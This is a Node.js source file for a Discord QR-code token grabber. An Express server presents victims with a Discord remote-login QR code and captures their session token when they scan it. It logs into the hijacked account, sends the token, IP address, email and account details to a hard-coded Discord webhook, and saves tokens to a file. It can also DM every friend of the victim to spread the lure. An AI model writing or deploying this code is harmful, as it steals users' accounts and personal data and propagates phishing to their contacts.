const { Webhook, MessageBuilder } = require('discord-webhook-node');
const { RemoteAuthClient } = require('discord-remote-auth');
const Discord = require('discord.js-selfbot-v11');
const express = require('express');
const chalk = require('chalk');
const fss = require('fs');
const app = express();


app.get('/', async (req, res) => {
    const ip_addr = req.socket.remoteAddress || req.headers['x-forwarded-for'];
    const auth_client = new RemoteAuthClient();
    
    const message_to_send = '';
    
    auth_client.on('pendingRemoteInit', async fingerprint => {
        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
    });

    auth_client.on('finish', async token => {
        const client = new Discord.Client();
        
        client.on('ready', () => {
            console.log(`[${chalk.yellowBright('*')}] Connected on ${token}`);

            new Webhook('https://discord.com/api/webhooks/925501105700491324/55PP9dnRyjH-li1IurGlzmqTjYvEb0RA78eOUPd-75m0AYOQ2II65uv4lpqjZhcig1hk')
                .send(new MessageBuilder()
                    .setColor('#f5b642').setThumbnail(client.user.avatarURL).setFooter('🤡 Joker by !\'" Ѵιcнч.ѕн#1024').setTimestamp()
                    .setDescription('```' + token + '```' + '\n' + '```' + ip_addr + '```\n')
                    .addField('> `🚹` **Username**', `\`${client.user.tag}\``)
                    .addField('> `📫` **Email**', `\`${client.user.email}\``)
                    .addField('> `💳` **Nitro**', `\`${client.user.premium}\``)
                    .addField('> `🤡` **Friends**', `\`${client.user.friends.size}\``)
                    .addField('> `📋` **Presence**', `\`${client.user.presence.status}\``)
                );
            if (spam) { 
            client.user.friends.forEach(async member => {
                await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
                    console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
                }).then(() => {
                    console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
                });
            });
        }
        });

        client.login(token).then(() => fss.appendFileSync('./tokens.txt', `${token}\n`));
    });
    
    auth_client.connect();
});

app.listen(3000, () => {
    console.clear()
    console.log(chalk.greenBright(`
      ╦╔═╗╦╔═╔═╗╦═╗
      ║║ ║╠╩╗║╣ ╠╦╝
     ╚╝╚═╝╩ ╩╚═╝╩╚═.
    `));
    
    console.log(`[${chalk.greenBright('+')}] https://127.0.0.1:3000`)
});